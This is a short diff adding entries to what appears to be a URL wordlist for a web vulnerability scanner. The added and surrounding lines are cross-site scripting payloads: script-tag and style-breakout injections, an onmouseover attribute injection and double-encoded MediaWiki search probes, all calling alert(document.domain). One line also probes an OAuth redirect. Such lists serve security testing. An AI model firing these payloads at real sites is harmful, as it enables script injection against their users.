@@ -11,3 +11,6 @@
 /NoSuchPage/widget?id=%22%20onmouseover=%22alert(document.domain)%22%20x=%22
 /auth/authorize?client_id=yamcs-web&state=stable-state&response_mode=query&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fexample.com%2Fcbi0i7y\
 /shop/?module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&pr1=0&pr2=0
+/api/app-images/logo?color=red%7D%3C%2Fstyle%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3Cstyle%3Ex%7B
+/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+/w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
